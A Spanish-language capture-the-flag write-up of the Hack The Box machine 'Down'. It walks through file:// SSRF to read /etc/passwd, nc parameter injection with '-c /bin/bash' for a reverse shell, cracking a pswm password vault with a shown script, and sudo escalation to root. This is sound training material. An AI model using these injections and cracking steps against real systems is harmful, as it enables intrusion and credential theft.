---
title: Down
layout: default
---
## ENUMERACIÓN INICIAL

Primero comprobaremos que tenemos conexión con el equipo.

```bash
$ ping -c 1 10.129.180.121
PING 10.129.180.121 (10.129.180.121) 56(84) bytes of data.
64 bytes from 10.129.180.121: icmp_seq=1 ttl=63 time=7.42 ms

--- 10.129.180.121 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 7.420/7.420/7.420/0.000 ms
```

Tras verificar que tenemos conexión con el dispositivo, procedemos a enumerar los puertos que tiene abiertos con **nmap**, una herramienta utilizada para escanear puertos abiertos en un dispositivo, equipos activos en una red, etc.

```bash
$ nmap 10.129.180.121
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-18 14:23 CDT
Nmap scan report for 10.129.180.121
Host is up (0.010s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

Vemos que tiene 2 puertos abiertos, el puerto 22 por el que corre un servicio SSH y el 80 por el que corre un servicio HTTP, analicemos las versiones de cada uno por si son versiones vulnerables a una vulnerabilidad pública.

```bash
$ nmap -p22,80 -sCV 10.129.180.121
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-18 14:27 CDT
Nmap scan report for 10.129.180.121
Host is up (0.0078s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
|_  256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Is it down or just me?
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
```

A priori no parecen ser versiones vulnerables a un CVE que nos interese, veamos de qué trata el servidor web.

## EXPLOTACIÓN

![Down]({{ "/assets/images/Down1.png"}})

No encontramos un servidor que nos solicita una entrada, una URL para ser más concretos, y nos va a decir si el sitio está activo o no.

Podemos probar a abrir un servidor web en nuestra máquina atacante y ver cómo reacciona el servidor si ponemos nuestra URL en el sitio web que estamos atacando:

```bash
$ nc -lvnp 8000
listening on [any] 8000 ...
```

Procedemos a ingresar nuestra URL en la página web a ver cómo reacciona:

![Down]({{ "/assets/images/Down2.png"}})

Cómo hemos abierto el puerto 8000 con nc, no es un servidor web, así que no nos dice nada, pero en el puerto a escucha recibimos lo siguiente:

```bash
$ nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.64] from (UNKNOWN) [10.129.180.121] 49598
GET / HTTP/1.1
Host: 10.10.14.64:8000
User-Agent: curl/7.81.0
Accept: */*
```

Vemos que el User-Agent es **curl**, por lo que parece que inserta la URL que pide al usuario dentro del comando, pero, ¿filtrará?, podemos comprobarlo, capturemos la petición con BurpSuite:

Aclarar que sí abrimos el servidor web con el módulo **http.server** de Python o de otra forma que sí sea un servidor web, veremos como nos da el código html en la página web, tal y como nos lo daría la salida del comando **curl $URL** tal que así:

![Down]({{ "/assets/images/Down3.png"}})

Ahora sí, vamos a capturar la petición con BurpSuite a hacer pruebas:

![Down]({{ "/assets/images/Down4.png"}})

Hice una prueba de ejecutar el comando **whoami** después de poner un "**;**" tras la URL, no obstante no funcionó, aunque si hacemos un curl a nuestra IP seguido del "**;**" veremos como sí nos llega la petición, por lo que si podemos ejecutar comandos pero no vemos la salida, así que, teniendo en cuenta que usa curl, veamos el comando en GTFOBins:

![Down]({{ "/assets/images/Down5.png"}})

Podemos con curl, subir archivos, descargar, leer, etc. Especialmente la de leer archivos nos interesa, veamos esto:

![Down]({{ "/assets/images/Down6.png"}})

Podemos leer archivos con el parámetro **file://**, probemos a usarlo para leer el archivo **/etc/passwd**:

![Down]({{ "/assets/images/Down7.png"}})

Parece ser que solo permite el protocolo http y https, no obstante, haciendo más pruebas, vemos que solo pide que empiece por ello, así que, vamos a poner **http://** y luego el parámetro para leer archivos de seguido:

![Down]({{ "/assets/images/Down8.png"}})

Como podemos ver, pudimos leer el archivo **/etc/passwd**, y vemos que existe el usuario **aleks**, vamos a intentar leer el código fuente de la página web en la que insertamos la URL, cuyo nombre es **index.php** y, aunque no sabemos su ruta, podemos probar con las típicas como **/var/www/html** por ejemplo.

![Down]({{ "/assets/images/Down9.png"}})

Como podemos ver, tenemos el código fuente, que se encontraba en la ruta dicha previamente, vamos a decodificarlo con Burp Decoder para leerlo mejor, ya que está codificado en HTML:

![Down]({{ "/assets/images/Down10.png"}})

Una vez decodificado, lo copiamos a un archivo y lo inspeccionamos.

Una vez viendo el código fuente, podemos ver una parte en la que dice que si usamos el parámetro **expertmode** con el valor **tcp**, recibiremos una página diferente, que nos pedirá 2 parámetros, IP, y puerto, los cuales vemos en esa parte de código que utiliza la herramienta **nc** para comprobar que está activo el host e inyecta la IP y el puerto sin filtrar en el comando:

![Down]({{ "/assets/images/Down11.png"}})

Tras esto, iremos directamente a probar a usar ese parámetro y valor:

![Down]({{ "/assets/images/Down12.png"}})

Podemos ver que ahora nos pide la IP y el puerto, y como lo inyecta directamente sin filtrar en el comando nc, aañdiremos después del puerto el parámetro **-c /bin/bash**, lo que nos dará una reverse shell a nuestra IP por el puerto que pongamos a escucha, para esto, podemos, o bien quitar en el front-end el campo **type: number** en el campo del puerto, o bien añadiendo el parámetro directamente desde BurpSuite, en este caso quitaremos el type: number del front-end:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
```

![Down]({{ "/assets/images/Down13.png"}})

Una vez eliminado y puesto a la escucha nuestro puerto por el que queremos recibir la reverse shell, podemos enviar la petición con el parámetro dicho previamente en el campo del puerto tras quitar el tipo de contenido que espera el front-end:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.64] from (UNKNOWN) [10.129.180.121] 58614
whoami
www-data
```

Como podemos ver, obtuvimos una reverse shell mediante inyección de parámetros en comandos, vamos a hacer la shell más interactiva:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@down:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@down:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 4444
```

Una vez en segundo plano, ejecutamos el siguiente comando en nuestra máquina atacante:

```bash
$ stty -echo raw;fg
```

Deberíamos estar en la máquina víctima con una shell completamente interactiva.

## ESCALADA DE PRIVILEGIOS

Ahora listemos el contenido del directorio actual:

```bash
www-data@down:/var/www/html$ ls
index.php  logo.png  style.css	user_aeT1xa.txt
```

Vemos la flag de usuario en la raíz del servidor web, cuyo nombre es **user_aeT1xa.txt**, cuyo contenido podríamos haber visto desde el navegador desde un principio si hubiesemos conocido el nombre del archivo ya que se encuentra en la raíz.

Bien, listemos el contenido dentro del directorio de el usuario **aleks**, ya que es el único que ha sido creado manualmente en el sistema:

```bash
www-data@down:/home/aleks$ find . -type f 2>/dev/null 
./.lesshst
./.bashrc
./.sudo_as_admin_successful
./.local/share/pswm/pswm
./.profile
./.bash_logout
```

Vemos un archivo dentro de **.local/share/pswm/**, busquemos que es **pswm**:

![Down]({{ "/assets/images/Down14.png"}})

Parece ser un gestor de contraseñas que se usa desde el CLI, se encripta con una contraseña (clave maestra) que solo debería conocer el dueño de las contraseñas, no obstante, si echamos un vistazo al archivo vemos lo siguiente:

```bash
www-data@down:/home/aleks$ cat .local/share/pswm/pswm;echo
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
```

Lo cual parece ser el contenido encriptado, vamos a copiar el contenido en un archivo local.

Una vez copiado, una búsqueda rápida en internet y encontramos la herramienta **pswm-decryptor** de **serionctf** en github, clonaremos el repositorio e instalaremos lo necesario para poder usar la herramienta:

```bash
$ git clone https://github.com/seriotonctf/pswm-decryptor.git
```

Instalamos los módulos necesarios para ejecutar la herramienta:

```bash
$ pip3 install cryptocode prettytable
```

Podemos usar la opción **-h** para ver el panel de ayuda y qué parámetros debemos de poner para la ejecución, no obstante, en el repositorio de github podemos verlo también, siguiendo la forma en la que nos indica que se ejecuta, lo probamos:

```bash
$ cat pswm-decrypt.py
import cryptocode
import argparse
from prettytable import PrettyTable

class CustomHelpFormatter(argparse.HelpFormatter):
    def __init__(self, prog):
        super().__init__(prog, max_help_position=50)

def bf(encrypted_text, wordlist):
    with open(wordlist, "r", encoding="utf-8") as f:
        for password in f:
            decrypted_text = cryptocode.decrypt(encrypted_text, password.strip())
            if decrypted_text:
                print("[+] Master Password: %s" % password.strip())
                print_decrypted_text(decrypted_text)
                return
    print("[-] Password Not Found!")

def print_decrypted_text(decrypted_text):
    table = PrettyTable()
    table.field_names = ["Alias", "Username", "Password"]
    for line in decrypted_text.splitlines():
        alias, username, password = line.split("\t")
        table.add_row([alias.strip(), username.strip(), password.strip()])
    table.align = "l"
    print("[+] Decrypted Data:")
    print(table)

def main():
    parser = argparse.ArgumentParser(description="pswm master password cracker", formatter_class=CustomHelpFormatter)
    parser.add_argument("-f", "--file", required=True, help="Path to the encrypted file")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
    args = parser.parse_args()

    with open(args.file, "r") as f:
        encrypted_text = f.read().strip()
    
    bf(encrypted_text, args.wordlist)

if __name__ == "__main__":
```

Echamos un vistazo al código de la herramienta para entender cómo funciona, tras eso, la ejecutamos y/o hacemos alguna modificación si procede, en este caso, usaremos el diccionario **rockyou.txt** para tratar de desencriptarlo, con un poco de suerte está ahí la contraseña :D.

```bash
$ python3 pswm-decrypt.py -f pswm -w rockyou.txt
[+] Master Password: flower
[+] Decrypted Data:
+------------+----------+----------------------+
| Alias      | Username | Password             |
+------------+----------+----------------------+
| pswm       | aleks    | flower               |
| aleks@down | aleks    | 1uY3w22uc-Wr{xNHR~+E |
+------------+----------+----------------------+
```

Podemos ver cómo la herramienta ha conseguido la contraseña, es **flower** para desencriptarla, y la de abajo es la contraseña del usuario, intentemos conectarnos vía ssh con el usuario **aleks** y la contraseña conseguida:

```bash
$ ssh aleks@10.129.180.121
The authenticity of host '10.129.180.121 (10.129.180.121)' can't be established.
ED25519 key fingerprint is SHA256:uq3+WwrPajXEUJC3CCuYMMlFTVM8CGYqMtGB9mI29wg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.180.121' (ED25519) to the list of known hosts.
(aleks@10.129.180.121) Password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-138-generic x86_64)
```

Cómo podemos ver, podemos loguearnos, bien, nos falta escalar al usuario **root**, veamos que privilegios como sudo tenemos:

```bash
aleks@down:~$ sudo -l
[sudo] password for aleks: 
Matching Defaults entries for aleks on down:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User aleks may run the following commands on down:
    (ALL : ALL) ALL
```

Al parecer, podemos ejecutar todo como sudo, por lo tanto, ejecutaremos el comando **sudo su** para suplantar al usuario **root**:

```bash
aleks@down:~$ sudo su
root@down:/home/aleks# whoami
root
root@down:/home/aleks# cd ~ && ls
root.txt  snap
```

Cómo podemos ver, hemos conseguido ser el usuario **root** y encontramos la flag de **root** en su directorio Home.

Hasta aquí el Write-Up de la máquina **Down** de HTB, Keep hacking!
